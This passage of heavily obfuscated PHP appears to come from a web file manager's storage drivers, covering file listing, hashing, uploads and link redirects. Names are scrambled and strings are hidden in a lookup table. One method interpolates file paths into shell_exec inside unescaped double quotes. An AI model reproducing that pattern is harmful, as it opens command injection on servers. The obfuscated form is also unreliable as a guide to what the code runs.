get_mode($ò½ÎÄÁ¾)); return $Ò±¯‹ê; } private function fileInfo($ğç­±çÃ, $§Â‰™Êõ = false) { $ÖÎª¤²ö =& $_SERVER[ïëó©ÒÚ]; $½­›‚îÉ = $this->iconvApp($this->pathThis($ğç­±çÃ)); if ($§Â‰™Êõ) { return array($ÖÎª¤²ö[32] => $½­›‚îÉ, $ÖÎª¤²ö[84] => $this->getPathOuter($ğç­±çÃ), $ÖÎª¤²ö[33] => $ÖÎª¤²ö[199], $ÖÎª¤²ö[76] => $this->size($ğç­±çÃ), $ÖÎª¤²ö[174] => $this->ext($½­›‚îÉ)); } $îƒ†ˆ¿ğ = array($ÖÎª¤²ö[32] => $½­›‚îÉ, $ÖÎª¤²ö[84] => $this->getPathOuter($ğç­±çÃ), $ÖÎª¤²ö[33] => $ÖÎª¤²ö[199], $ÖÎª¤²ö[200] => @filectime($ğç­±çÃ), $ÖÎª¤²ö[85] => @filemtime($ğç­±çÃ), $ÖÎª¤²ö[1380] => @fileatime($ğç­±çÃ), $ÖÎª¤²ö[76] => $this->size($ğç­±çÃ), $ÖÎª¤²ö[174] => $this->ext($½­›‚îÉ), $ÖÎª¤²ö[1381] => is_readable($ğç­±çÃ), $ÖÎª¤²ö[1382] => is_writable($ğç­±çÃ), $ÖÎª¤²ö[1383] => get_mode($ğç­±çÃ)); return $îƒ†ˆ¿ğ; } public function exist($¤¬Ë¶…Æ) { $¤¬Ë¶…Æ = $this->iconvSystem($¤¬Ë¶…Æ); return @file_exists($¤¬Ë¶…Æ); } public function isFile($ääû‚é) { $ääû‚é = $this->iconvSystem($ääû‚é); return @is_file($ääû‚é); } public function isFolder($”ÂÙá¢) { $”ÂÙá¢ = $this->iconvSystem($”ÂÙá¢); return @is_dir($”ÂÙá¢); } public function listPath($®òÏŠ¹æ, $×ü¦îé = false) { $›ÇîÛë =& $_SERVER[ïëó©ÒÚ]; $®òÏŠ¹æ = $this->iconvSystem($®òÏŠ¹æ); $®òÏŠ¹æ = rtrim($®òÏŠ¹æ, $›ÇîÛë[8]) . $›ÇîÛë[8]; $—ïƒÆ‘ = array($›ÇîÛë[82] => array(), $›ÇîÛë[83] => array()); if (!($§ÄÓèºë = @opendir($®òÏŠ¹æ))) { return $—ïƒÆ‘; } while (($Ï‰¸…¬› = readdir($§ÄÓèºë)) !== !1) { if ($Ï‰¸…¬› == $›ÇîÛë[10] || $Ï‰¸…¬› == $›ÇîÛë[1377]) { continue; } $¨‡íÈÛ… = $®òÏŠ¹æ . $Ï‰¸…¬›; if (is_file($¨‡íÈÛ…)) { $—ïƒÆ‘[$›ÇîÛë[83]][] = $this->fileInfo($¨‡íÈÛ…, $×ü¦îé); } else { $—ïƒÆ‘[$›ÇîÛë[82]][] = $this->folderInfo($¨‡íÈÛ…, $×ü¦îé); } } closedir($§ÄÓèºë); return $—ïƒÆ‘; } public function listAll($“ìƒÖ³, &$‹ÒÙØÁ = array()) { $ù«ùÇ”® =& $_SERVER[ïëó©ÒÚ]; $“ìƒÖ³ = $this->iconvSystem($“ìƒÖ³); $“ìƒÖ³ = rtrim($“ìƒÖ³, $ù«ùÇ”®[8]) . $ù«ùÇ”®[8]; if (!($¹“™ÁåË = @opendir($“ìƒÖ³))) { return $‹ÒÙØÁ; } while (($°òÜğÆÛ = readdir($¹“™ÁåË)) !== !1) { if ($°òÜğÆÛ == $ù«ùÇ”®[10] || $°òÜğÆÛ == $ù«ùÇ”®[1377]) { continue; } $³ŠÛÆÊ‚ = $“ìƒÖ³ . $°òÜğÆÛ; if (is_dir($³ŠÛÆÊ‚) && !is_link($³ŠÛÆÊ‚)) { $‹ÒÙØÁ[] = array($ù«ùÇ”®[84] => $³ŠÛÆÊ‚ . $ù«ùÇ”®[8], $ù«ùÇ”®[75] => 1, $ù«ùÇ”®[85] => @filemtime($³ŠÛÆÊ‚), $ù«ùÇ”®[76] => 0); $this->listAll($³ŠÛÆÊ‚, $‹ÒÙØÁ); } else { $‹ÒÙØÁ[] = array($ù«ùÇ”®[84] => $³ŠÛÆÊ‚, $ù«ùÇ”®[75] => 0, $ù«ùÇ”®[85] => @filemtime($³ŠÛÆÊ‚), $ù«ùÇ”®[76] => $this->size($³ŠÛÆÊ‚)); } } closedir($¹“™ÁåË); return $‹ÒÙØÁ; } public function has($·•æ¦˜, $áÎ†âìÂ = false, $˜ö²Íõ† = true) { $Ñ“÷ÏÉ‰ =& $_SERVER[ïëó©ÒÚ]; $·•æ¦˜ = $this->iconvSystem($·•æ¦˜); $·•æ¦˜ = rtrim($·•æ¦˜, $Ñ“÷ÏÉ‰[8]) . $Ñ“÷ÏÉ‰[8]; if (!($Õ±£í¡— = @opendir($·•æ¦˜))) { return !1; } $Õîñöãê = 0; $Ø¯äç— = 0; $Ú¦ŒéË¥ = 0; while (($°ü¬™ = readdir($Õ±£í¡—)) !== !1) { if ($°ü¬™ == $Ñ“÷ÏÉ‰[10] || $°ü¬™ == $Ñ“÷ÏÉ‰[1377]) { continue; } $Õ«Òªäö = $·•æ¦˜ . $°ü¬™; if ($áÎ†âìÂ) { $Ú¦ŒéË¥++; if (@is_file($Õ«Òªäö)) { $Õîñöãê++; } else { $Ø¯äç—++; } if ($Ú¦ŒéË¥ > 10000) { break; } continue; } if ($˜ö²Íõ†) { if (@is_file($Õ«Òªäö)) { return !0; } } else { if (@is_dir($Õ«Òªäö . $Ñ“÷ÏÉ‰[8])) { return !0; } } } closedir($Õ±£í¡—); if ($áÎ†âìÂ) { return array($Ñ“÷ÏÉ‰[207] => $Õîñöãê, $Ñ“÷ÏÉ‰[208] => $Ø¯äç—); } return !1; } public function hashSimple($É”Œ¤êˆ) { $ãÄÕÕÃ§ =& $_SERVER[ïëó©ÒÚ]; if (!$É”Œ¤êˆ) { return md5($ãÄÕÕÃ§[12]); } $É”Œ¤êˆ = $this->iconvSystem($É”Œ¤êˆ); $³×Ä”¿Ö = $this->size($É”Œ¤êˆ); $Å¨¸ü† = 200; $ˆ¶ºĞªï = 50; if ($³×Ä”¿Ö <= $Å¨¸ü† * $ˆ¶ºĞªï) { return $this->hashMd5($É”Œ¤êˆ) . $³×Ä”¿Ö; } $Ë­¨È = $ãÄÕÕÃ§[12]; $¡Ç»’âò = intval($³×Ä”¿Ö / $ˆ¶ºĞªï); $’ĞŒ‚ÃÊ = fopen($É”Œ¤êˆ, $ãÄÕÕÃ§[1384]); if (!$’ĞŒ‚ÃÊ) { return $Ë­¨È; } for ($ÒÆ¬’ü = 0; $ÒÆ¬’ü < $ˆ¶ºĞªï; $ÒÆ¬’ü++) { fseek_64($’ĞŒ‚ÃÊ, $¡Ç»’âò * $ÒÆ¬’ü); $Ë­¨È .= fread($’ĞŒ‚ÃÊ, $Å¨¸ü†); } fseek_64($’ĞŒ‚ÃÊ, $³×Ä”¿Ö - $Å¨¸ü†); $Ë­¨È .= fread($’ĞŒ‚ÃÊ, $Å¨¸ü†); fclose($’ĞŒ‚ÃÊ); return md5($Ë­¨È) . $³×Ä”¿Ö; } public function getContent($œèà†ëÂ) { $œèà†ëÂ = $this->iconvSystem($œèà†ëÂ); return file_get_contents($œèà†ëÂ); } public function setContent($ÀşÙ ãğ, $ÌÏ“¬å• = '') { $ÀşÙ ãğ = $this->iconvSystem($ÀşÙ ãğ); $ÔÎ•şÚ¸ = @file_put_contents($ÀşÙ ãğ, $ÌÏ“¬å•, LOCK_EX); clearstatcache(); @chmod($ÀşÙ ãğ, $this->pathAuth); return $ÔÎ•şÚ¸ === !1 ? !1 : !0; } public function fileSubstr($—ËñòÆ, $ê·ÛÄÕÕ = 0, $Û°ÊµÖÌ = false) { $€–óØ‰ˆ =& $_SERVER[ïëó©ÒÚ]; $—ËñòÆ = $this->iconvSystem($—ËñòÆ); if ($Û°ÊµÖÌ === !1) { $Û°ÊµÖÌ = $this->size($—ËñòÆ); } if ($Û°ÊµÖÌ <= 0) { return $€–óØ‰ˆ[12]; } $í¦çŒ¬À = fopen($—ËñòÆ, $€–óØ‰ˆ[1384]); if (!$í¦çŒ¬À) { return !1; } fseek_64($í¦çŒ¬À, $ê·ÛÄÕÕ); $ÜáÛÈ±õ = fread($í¦çŒ¬À, $Û°ÊµÖÌ); fclose($í¦çŒ¬À); return $ÜáÛÈ±õ; } public function upload($ø­›‡§„, $ûğÓØÏÏ, $ˆ™ÀŒæå = false, $È¸â = REPEAT_REPLACE) { if ($ˆ™ÀŒæå) { return $this->moveFile($ûğÓØÏÏ, $ø­›‡§„); } return $this->copyFile($ûğÓØÏÏ, $ø­›‡§„); } public function setModifyTime($ôÓ”±¯ç, $×·÷²Æ = '') { @touch($ôÓ”±¯ç, intval($×·÷²Æ)); } public function download($Í¶¡ÒšÕ, $ß²ùŠ) { return $this->iconvSystem($Í¶¡ÒšÕ); } } class PathDriverOOS extends PathDriverBaseS3 { public function __construct($úÅ·Ëº) { parent::__construct($úÅ·Ëº); $this->signatureVersion($_SERVER[ïëó©ÒÚ][216]); } public function fileOutLink($âì®Ó¥) { $­²—ñİ =& $_SERVER[ïëó©ÒÚ]; if (substr($âì®Ó¥, 0, 7) == $­²—ñİ[1328]) { $âì®Ó¥ = $­²—ñİ[1329] . substr($âì®Ó¥, 7); } header($­²—ñİ[161] . $âì®Ó¥); die; } } goto d¤®øÀ’Í; eÕ”åÇ®ëº: class PathDriverBase { public $pathDriver = ''; public $pathBase = ''; public $path = ''; public $pathID = ''; public $_data = array(); public function __construct() { $¬äÃ¥é¥ =& $_SERVER[ïëó©ÒÚ]; $this->objectDriver = array($¬äÃ¥é¥[60], $¬äÃ¥é¥[61], $¬äÃ¥é¥[62], $¬äÃ¥é¥[63], $¬äÃ¥é¥[64], $¬äÃ¥é¥[65], $¬äÃ¥é¥[66], $¬äÃ¥é¥[67], $¬äÃ¥é¥[68]); $this->_classObjectID = mt_rand(0, 10000); } public function getPath($Ş „‹ï) { if (in_array($this->getType(), $this->objectDriver)) { return ltrim($Ş „‹ï, $_SERVER[ïëó©ÒÚ][8]); } return $Ş „‹ï; } public function iconvApp($å±òÄ“İ) { return $å±òÄ“İ; } public function iconvSystem($š¸¤øú) { return $š¸¤øú; } public function iconvTo($¹ÖÔÈ¢‡, $à½²§¡Ø, $—Ì “©ğ) { $ıÚ§Á¸ =& $_SERVER[ïëó©ÒÚ]; if (!$¹ÖÔÈ¢‡ || !function_exists($ıÚ§Á¸[69])) { return $¹ÖÔÈ¢‡; } static $ÑÎöÄÌ— = array(); $ö®¡Ú = $à½²§¡Ø . $ıÚ§Á¸[70] . $—Ì “©ğ . $ıÚ§Á¸[71] . $¹ÖÔÈ¢‡; if (isset($ÑÎöÄÌ—[$ö®¡Ú])) { return $ÑÎöÄÌ—[$ö®¡Ú]; } if (function_exists($ıÚ§Á¸[72])) { $©ÛÒ£¬ã = @mb_convert_encoding($¹ÖÔÈ¢‡, $—Ì “©ğ, $à½²§¡Ø); } else { $©ÛÒ£¬ã = @iconv($à½²§¡Ø, $—Ì “©ğ, $¹ÖÔÈ¢‡); } $©ÛÒ£¬ã = $©ÛÒ£¬ã ? $©ÛÒ£¬ã : $¹ÖÔÈ¢‡; if (strstr($©ÛÒ£¬ã, $ıÚ§Á¸[73])) { $©ÛÒ£¬ã = str_replace($ıÚ§Á¸[73], $ıÚ§Á¸[11], $©ÛÒ£¬ã); } $ÑÎöÄÌ—[$à½²§¡Ø . $ıÚ§Á¸[70] . $—Ì “©ğ . $ıÚ§Á¸[71] . $¹ÖÔÈ¢‡] = $©ÛÒ£¬ã; $ÑÎöÄÌ—[$—Ì “©ğ . $ıÚ§Á¸[70] . $à½²§¡Ø . $ıÚ§Á¸[71] . $¹ÖÔÈ¢‡] = $¹ÖÔÈ¢‡; $ÑÎöÄÌ—[$—Ì “©ğ . $ıÚ§Á¸[70] . $à½²§¡Ø . $ıÚ§Á¸[71] . $©ÛÒ£¬ã] = $¹ÖÔÈ¢‡; $ÑÎöÄÌ—[$à½²§¡Ø . $ıÚ§Á¸[70] . $—Ì “©ğ . $ıÚ§Á¸[71] . $©ÛÒ£¬ã] = $©ÛÒ£¬ã; return $©ÛÒ£¬ã; } public function getPathInner($ô»ØÏÎò) { $¼÷óä¨ê = IO::init($ô»ØÏÎò); return $¼÷óä¨ê->path; } public function getPathOuter($Å—È‡¾¹) { $¢‘ºœ‘Â =& $_SERVER[ïëó©ÒÚ]; $•·Ó›± = strlen(trim($this->pathBase, $¢‘ºœ‘Â[8])); $Å—È‡¾¹ = substr(trim($Å—È‡¾¹, $¢‘ºœ‘Â[8]), $•·Ó›±); return $this->pathDriver . $¢‘ºœ‘Â[8] . ltrim($Å—È‡¾¹, $¢‘ºœ‘Â[8]); } public function isParentOf($›¡ÆÑˆã, $¦±Õ¥“í) { $„âûİª =& $_SERVER[ïëó©ÒÚ]; $›¡ÆÑˆã = rtrim(strtolower($›¡ÆÑˆã), $„âûİª[8]) . $„âûİª[8]; $¦±Õ¥“í = rtrim(strtolower($¦±Õ¥“í), $„âûİª[8]) . $„âûİª[8]; $à×ä ó = strpos($¦±Õ¥“í, $›¡ÆÑˆã) === 0; return $à×ä ó; } public function getType() { $µç±¥€ç =& $_SERVER[ïëó©ÒÚ]; $·éØ¿ÏŞ = str_replace($µç±¥€ç[74], $µç±¥€ç[12], get_class($this)); return strtolower($·éØ¿ÏŞ); } public function isTypeObject() { if (!is_array($this->objectDriver)) { return !1; } return in_array($this->getType(), $this->objectDriver); } public function fileNameExist($Å®æä‡Õ, $©Æ‘±Ü) { $ˆïÆ¯¹ =& $_SERVER[ïëó©ÒÚ]; $Ç×ŒçÌê = rtrim($Å®æä‡Õ, $ˆïÆ¯¹[8]) . $ˆïÆ¯¹[8] . $©Æ‘±Ü; $Âíºıóù = $this->exist($Ç×ŒçÌê); return $Âíºıóù ? $Ç×ŒçÌê : !1; } public function setModifyTime($ÎÄÙ”À¼, $‡éõ‘Ï† = '') { } public function renameObject($êÏ¹¨ÀÔ, $ığì•ô) { $Üğ³¿ŞË = $ığì•ô; $êÏ¹¨ÀÔ = $this->getPathOuter($êÏ¹¨ÀÔ); $ığì•ô = $this->pathFather($êÏ¹¨ÀÔ) . $ığì•ô; $åÌ¦í—ñ = IO::copy($êÏ¹¨ÀÔ, $this->pathFather($êÏ¹¨ÀÔ), REPEAT_RENAME_FOLDER, $Üğ³¿ŞË); if ($åÌ¦í—ñ) { IO::remove($êÏ¹¨ÀÔ); } return $åÌ¦í—ñ ? $ığì•ô : !1; } public function tempFile($°’Ş = '', $‚ñ¥š€„ = '') { if (!$°’Ş) { $°’Ş = rand_string(15); } $’’¯¸Ü = TEMP_FILES . rand_string(15) . $_SERVER[ïëó©ÒÚ][8]; @mkdir($’’¯¸Ü, DEFAULT_PERRMISSIONS, !0); $î´¯ŒÃÁ = $’’¯¸Ü . $°’Ş; @touch($î´¯ŒÃÁ); if ($‚ñ¥š€„) { file_put_contents($î´¯ŒÃÁ, $‚ñ¥š€„); } return $î´¯ŒÃÁ; } public function tempFileRemve($ò‚‡Ÿ°) { @unlink($ò‚‡Ÿ°); @rmdir($this->pathFather($ò‚‡Ÿ°)); } public function mkfile($«†œèÚ, $Ã¦•Š÷ï = '', $ŠŒ°‚ôĞ = REPEAT_RENAME) { } public function mkdir($³¨ŠØã˜, $øÍŒ²€¬ = REPEAT_SKIP) { } public function delFile($»†¢£Á‘) { } public function delFolder($–œ–¥ä) { } public function copyFile($•¯ÍÇÁ¿, $«»Éá…¨) { } public function moveFile($¹Òà¹Èû, $ö´ÀË­¿) { } public function remove($ğÍ³³) { if ($this->isFile($ğÍ³³)) { return $this->delFile($ğÍ³³); } return $this->delFolder($ğÍ³³); } public function rename($ØÌÇØ¼, $Ã»…—¡Ó) { } public function exist($ö·ÈÄ½Ù) { } public function findByHash($÷†£™ÛÛ = '', $®²Ô«ƒƒ = '') { return !1; } public function isFile($‘¾À»™ì) { } public function isFolder($Îø§ò…Á) { } public function size($ÑŸµæ¨) { } public function info($â‘æÅ’¤) { } public function infoSimple($±¦ÂÆóé) { return $this->info($±¦ÂÆóé); } public function infoAuth($‹ÇËúŸÒ) { return $this->info($‹ÇËúŸÒ); } public function infoFull($ŒŒÈü¹Ñ) { return $this->info($ŒŒÈü¹Ñ); } public function infoWithChildren($Ğª‡Æš•) { $Ìöª‹‘† =& $_SERVER[ïëó©ÒÚ]; static $Ÿ úˆÜå = array(); if (isset($Ÿ úˆÜå[$Ğª‡Æš•])) { return $Ÿ úˆÜå[$Ğª‡Æš•]; } $¿¬Œ‰ŒÕ = $this->info($Ğª‡Æš•); if ($¿¬Œ‰ŒÕ && $¿¬Œ‰ŒÕ[$Ìöª‹‘†[33]] == $Ìöª‹‘†[75]) { $´·ªô¥É = array($Ìöª‹‘†[76] => 0, $Ìöª‹‘†[77] => 0, $Ìöª‹‘†[78] => 0); $this->infoChildren($Ğª‡Æš•, $´·ªô¥É); $¿¬Œ‰ŒÕ[$Ìöª‹‘†[76]] = $´·ªô¥É[$Ìöª‹‘†[76]]; $¿¬Œ‰ŒÕ[$Ìöª‹‘†[79]] = array($Ìöª‹‘†[80] => $´·ªô¥É[$Ìöª‹‘†[77]], $Ìöª‹‘†[81] => $´·ªô¥É[$Ìöª‹‘†[78]]); $Ÿ úˆÜå[$Ğª‡Æš•] = $¿¬Œ‰ŒÕ; } return $¿¬Œ‰ŒÕ; } public function listPath($ÈÖÎŒº, $ë®†·ø = false) { } public function has($Ä«øÔ™¤, $¦ÔÃÃİ = false, $ÇÚé„¥ˆ = false) { } public function canRead($ûëÀÓÙø) { } public function canWrite($ˆã—’ÅÔ) { } public function getContent($ë³íĞˆı) { } public function setContent($Í¹¯êë, $ùçùŞÆÁ = '') { } protected function infoChildren($ÈØåø­ç, &$Êõµù¸½) { $ƒÊåº–¸ =& $_SERVER[ïëó©ÒÚ]; check_abort_echo(); $¹îçêœ˜ = $this->listPath($ÈØåø­ç, !0); $¹îçêœ˜ = array_merge($¹îçêœ˜[$ƒÊåº–¸[82]], $¹îçêœ˜[$ƒÊåº–¸[83]]); foreach ($¹îçêœ˜ as $ä°’­§) { if ($ä°’­§[$ƒÊåº–¸[33]] == $ƒÊåº–¸[75]) { $Êõµù¸½[$ƒÊåº–¸[78]]++; $ÔÎŸ¬ùâ = $this->getPathInner($ä°’­§[$ƒÊåº–¸[84]]); $this->infoChildren($ÔÎŸ¬ùâ, $Êõµù¸½); } else { $Êõµù¸½[$ƒÊåº–¸[77]]++; $Êõµù¸½[$ƒÊåº–¸[76]] += $ä°’­§[$ƒÊåº–¸[76]]; } } } public function fileSubstr($¹üÕËÃ, $¾ˆÍØÈı, $»¶Îğ¼ö) { } public function listAll($Ûİêæõ¸) { } public function listAllMake($Õö÷úˆÏ, &$™Éàèãª) { $“¤À»…– =& $_SERVER[ïëó©ÒÚ]; check_abort_echo(); $Ñ°Éµ‹½ = $this->listPath($Õö÷úˆÏ, !0); if (!$Ñ°Éµ‹½) { return; } $˜µ¦¤€Œ = array_merge($Ñ°Éµ‹½[$“¤À»…–[82]], $Ñ°Éµ‹½[$“¤À»…–[83]]); foreach ($˜µ¦¤€Œ as $—íĞÛ„) { $ô¿É¨– = $—íĞÛ„[$“¤À»…–[33]] == $“¤À»…–[75]; $´öª»ËÏ = array($“¤À»…–[84] => $—íĞÛ„[$“¤À»…–[84]], $“¤À»…–[75] => $ô¿É¨–); if (isset($—íĞÛ„[$“¤À»…–[76]])) { $´öª»ËÏ[$“¤À»…–[76]] = $—íĞÛ„[$“¤À»…–[76]]; } if (isset($—íĞÛ„[$“¤À»…–[85]])) { $´öª»ËÏ[$“¤À»…–[85]] = $—íĞÛ„[$“¤À»…–[85]]; } if (!$ô¿É¨–) { $™Éàèãª[] = $´öª»ËÏ; continue; } $™Éàèãª[] = $´öª»ËÏ; $ÊÑÄŠÒ• = $—íĞÛ„[$“¤À»…–[84]]; $ÂÏ” á® = $this->pathDriver; if (substr($—íĞÛ„[$“¤À»…–[84]], 0, strlen($ÂÏ” á®)) == $ÂÏ” á®) { $ÊÑÄŠÒ• = substr($ÊÑÄŠÒ•, strlen($ÂÏ” á®)); } $this->listAllMake($ÊÑÄŠÒ•, $™Éàèãª); } } public function listAllSimple($±ÊÄØî®) { $¿…€»ßÎ =& $_SERVER[ïëó©ÒÚ]; $¶äÅş¸˜ = array(); $ĞÙ—ú÷‘ = $this->listAll($±ÊÄØî®); $ÍŠ¿¿Ù‰ = $this->getPathOuter($±ÊÄØî®); foreach ($ĞÙ—ú÷‘ as $ôü³Ğ€Õ) { $Â½–…ß‡ = $ôü³Ğ€Õ[$¿…€»ßÎ[84]]; $…ßÇÁœ³ = $ôü³Ğ€Õ[$¿…€»ßÎ[84]]; if (isset($ôü³Ğ€Õ[$¿…€»ßÎ[86]])) { $Â½–…ß‡ = $ôü³Ğ€Õ[$¿…€»ßÎ[86]][$¿…€»ßÎ[84]]; $ôü³Ğ€Õ[$¿…€»ßÎ[76]] = $ôü³Ğ€Õ[$¿…€»ßÎ[86]][$¿…€»ßÎ[76]]; $ôü³Ğ€Õ[$¿…€»ßÎ[85]] = $ôü³Ğ€Õ[$¿…€»ßÎ[86]][$¿…€»ßÎ[85]]; } else { $…ßÇÁœ³ = substr($ôü³Ğ€Õ[$¿…€»ßÎ[84]], strlen(get_path_father($ÍŠ¿¿Ù‰))); $…ßÇÁœ³ = $¿…€»ßÎ[8] . ltrim($…ßÇÁœ³, $¿…€»ßÎ[8]); } $•è‘Ùœ“ = array($¿…€»ßÎ[84] => $…ßÇÁœ³, $¿…€»ßÎ[75] => $ôü³Ğ€Õ[$¿…€»ßÎ[75]]); if (isset($ôü³Ğ€Õ[$¿…€»ßÎ[76]]) && !$ôü³Ğ€Õ[$¿…€»ßÎ[75]]) { $•è‘Ùœ“[$¿…€»ßÎ[76]] = $ôü³Ğ€Õ[$¿…€»ßÎ[76]]; } if (isset($ôü³Ğ€Õ[$¿…€»ßÎ[85]])) { $•è‘Ùœ“[$¿…€»ßÎ[85]] = $ôü³Ğ€Õ[$¿…€»ßÎ[85]]; } if (!$ôü³Ğ€Õ[$¿…€»ßÎ[75]]) { $•è‘Ùœ“[$¿…€»ßÎ[87]] = $Â½–…ß‡; } $¶äÅş¸˜[] = $•è‘Ùœ“; } return $¶äÅş¸˜; } public function upload($Œ°’Â®™, $­Û­ï™, $áİñ’Éê = false, $á¥ê»Í = REPEAT_REPLACE) { } public function uploadFileByID($¯«¶à’“, $±·Øä¿Í, $©‰»·ù) { } public function uploadFileByPath($ÙÏìÆãÒ, $ğ´³’™’, $İà¿Ëî = array()) { } public function isUploadServer() { $Î‘¤ìàñ =& $_SERVER[ïëó©ÒÚ]; if (isset($this->ioUploadServer) && $this->ioUploadServer == $Î‘¤ìàñ[88]) { return !0; } return $GLOBALS[$Î‘¤ìàñ[6]][$Î‘¤ìàñ[89]][$Î‘¤ìàñ[90]]; } public function isFileOutServer() { $€ôĞ¦öÁ =& $_SERVER[ïëó©ÒÚ]; if (isset($this->ioFileOutServer) && $this->ioFileOutServer == $€ôĞ¦öÁ[88]) { return !0; } return $GLOBALS[$€ôĞ¦öÁ[6]][$€ôĞ¦öÁ[89]][$€ôĞ¦öÁ[91]]; } public function isCdnHost() { return $this->isFileOutServer() || empty($this->cdnHost) ? !1 : !0; } public function getCdnLink($°ºÀÈ±Œ) { $®…¶¬€ =& $_SERVER[ïëó©ÒÚ]; if (!$this->isCdnHost()) { return $°ºÀÈ±Œ; } return str_replace(trim(get_url_root($°ºÀÈ±Œ), $®…¶¬€[8]), trim($this->cdnHost, $®…¶¬€[8]), $°ºÀÈ±Œ); } public function uploadLink($ÁÇª‚Ìä, $ĞßÁÊå˜ = 0) { $‚¡Ä«‡¯ =& $_SERVER[ïëó©ÒÚ]; if ($this->isUploadServer()) { return; } $ğÒ¬Œ¡ = $this->getType(); if (!in_array($ğÒ¬Œ¡, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $œ¯ùëÛç = 1024 * 1024 * 10; $£ã†æ¤‹ = $ĞßÁÊå˜ <= $œ¯ùëÛç ? $‚¡Ä«‡¯[92] : $‚¡Ä«‡¯[93]; $İ³‚¡²– = (!$ĞßÁÊå˜ ? 1 : ceil($ĞßÁÊå˜ / pow(1024, 3))) * 3600 * 4; $Èêï¤Âç = $this->{$£ã†æ¤‹}($ÁÇª‚Ìä, $İ³‚¡²–); if ($Èêï¤Âç) { $Èêï¤Âç[$‚¡Ä«‡¯[94]] = $ÁÇª‚Ìä; $Èêï¤Âç[$‚¡Ä«‡¯[95]] = $ğÒ¬Œ¡; } return $Èêï¤Âç; } public function uploadFormData($ğ¬ò¼ığ, $îŠÆ“½ = 3600) { } public function multiUploadFormData($Ú«øß¢Ù, $‡Ê®ùÔ§ = 3600) { } public function download($øÄİŞù, $†Ïğß×—) { } public function ext($¥æ›ğÒî) { $ş®Å¼­œ =& $_SERVER[ïëó©ÒÚ]; if (strpos($¥æ›ğÒî, $ş®Å¼­œ[8]) === -1) { $à‹Â•á« = $¥æ›ğÒî; } else { $à‹Â•á« = $this->pathThis($¥æ›ğÒî); } $ÎËèçã· = $ş®Å¼­œ[12]; if (strstr($à‹Â•á«, $ş®Å¼­œ[10])) { $ÎËèçã· = substr($à‹Â•á«, strrpos($à‹Â•á«, $ş®Å¼­œ[10]) + 1); $ÎËèçã· = strtolower($ÎËèçã·); } if (strlen($ÎËèçã·) > 3 && preg_match($ş®Å¼­œ[96], $ÎËèçã·, $Ù‹Ú¤ñç)) { $ÎËèçã· = $ş®Å¼­œ[12]; } return $ÎËèçã·; } public function pathThis($»Çã›ÅÊ) { $ñŠÜºğ =& $_SERVER[ïëó©ÒÚ]; $»Çã›ÅÊ = str_replace($ñŠÜºğ[97], $ñŠÜºğ[8], rtrim($»Çã›ÅÊ, $ñŠÜºğ[8])); $ó÷³¤í = strrpos($»Çã›ÅÊ, $ñŠÜºğ[8]); if ($ó÷³¤í === !1) { return $»Çã›ÅÊ; } return substr($»Çã›ÅÊ, $ó÷³¤í + 1); } public function pathFather($¿²¢×…Õ) { $ÙÛˆÖ¤¢ =& $_SERVER[ïëó©ÒÚ]; $¿²¢×…Õ = str_replace($ÙÛˆÖ¤¢[97], $ÙÛˆÖ¤¢[8], rtrim($¿²¢×…Õ, $ÙÛˆÖ¤¢[8])); $±÷Èú Ñ = strrpos($¿²¢×…Õ, $ÙÛˆÖ¤¢[8]); if ($±÷Èú Ñ === !1) { return $ÙÛˆÖ¤¢[12]; } return substr($¿²¢×…Õ, 0, $±÷Èú Ñ + 1); } public function hashSimple($õ¢å®¥) { $ìõ½Á¼¨ =& $_SERVER[ïëó©ÒÚ]; if (!$õ¢å®¥) { return md5($ìõ½Á¼¨[12]); } $ŸØÍÓ’– = $this->size($õ¢å®¥); $ÇÁøı = 200; $±¿Á¦Ÿ¦ = 50; if ($ŸØÍÓ’– <= $ÇÁøı * $±¿Á¦Ÿ¦) { return $this->hashMd5($õ¢å®¥) . $ŸØÍÓ’–; } $¥²¢„Ëî = intval($ŸØÍÓ’– / $±¿Á¦Ÿ¦); $¬¤Éúçè = $ìõ½Á¼¨[12]; for ($éÛÌ¿Á = 0; $éÛÌ¿Á < $±¿Á¦Ÿ¦; $éÛÌ¿Á++) { $¬¤Éúçè .= $this->fileSubstr($õ¢å®¥, $¥²¢„Ëî * $éÛÌ¿Á, $ÇÁøı); } $¬¤Éúçè .= $this->fileSubstr($õ¢å®¥, $ŸØÍÓ’– - $ÇÁøı, $ÇÁøı); return md5($¬¤Éúçè) . $ŸØÍÓ’–; } public static $md5Cache = array(); public function hashMd5($ÈĞËìİ) { if (!$ÈĞËìİ) { return md5($_SERVER[ïëó©ÒÚ][12]); } $ÈĞËìİ = $this->iconvSystem($ÈĞËìİ); if (isset(self::$md5Cache[$ÈĞËìİ])) { return self::$md5Cache[$ÈĞËìİ]; } self::$md5Cache[$ÈĞËìİ] = $this->hashMd5Shell($ÈĞËìİ); if (!self::$md5Cache[$ÈĞËìİ]) { self::$md5Cache[$ÈĞËìİ] = @md5_file($ÈĞËìİ); } return self::$md5Cache[$ÈĞËìİ]; } private function hashMd5Shell($›Í½–ı¿) { $‘¼Ùø—Ğ =& $_SERVER[ïëó©ÒÚ]; if (!$›Í½–ı¿) { return md5($‘¼Ùø—Ğ[12]); } if (!function_exists($‘¼Ùø—Ğ[98])) { return !1; } $‚ºª¡§ = array($‘¼Ùø—Ğ[99], $‘¼Ùø—Ğ[100]); $ö•“¸¸İ = Cache::get($‘¼Ùø—Ğ[101]); if (!$ö•“¸¸İ) { $•·Õ°„Ï = BASIC_PATH . $‘¼Ùø—Ğ[102]; $ÅÙîùò = md5_file($•·Õ°„Ï); $ö•“¸¸İ = $‘¼Ùø—Ğ[103]; foreach ($‚ºª¡§ as $»êî«³å) { $ºÈ„Ò¯ = shell_exec($»êî«³å . "\x20\42{$•·Õ°„Ï}\x22"); if ($ºÈ„Ò¯ && substr(trim($ºÈ„Ò¯), 0, 32) == $ÅÙîùò) { $ö•“¸¸İ = $»êî«³å; break; } } Cache::set($‘¼Ùø—Ğ[101], $ö•“¸¸İ, 3600); } if ($ö•“¸¸İ == $‘¼Ùø—Ğ[103]) { return !1; } $ºÈ„Ò¯ = shell_exec($ö•“¸¸İ . "\40\42{$›Í½–ı¿}\x22"); $ºÈ„Ò¯ = str_replace($‘¼Ùø—Ğ[104], $‘¼Ùø—Ğ[12], $ºÈ„Ò¯); return substr($ºÈ„Ò¯, 0, 32); } public function link($‚öğŒ) { return $‚öğŒ; } public function fileOut($œÎîÊ‘Ò, $™Šè•Ä = false, $œ…Ûö›£ = false, $¿œÆ¢Ùë = '') { $ê´½­¸÷ =& $_SERVER[ïëó©ÒÚ]; $this->cacheMethod(null, null); if (!$œÎîÊ‘Ò || 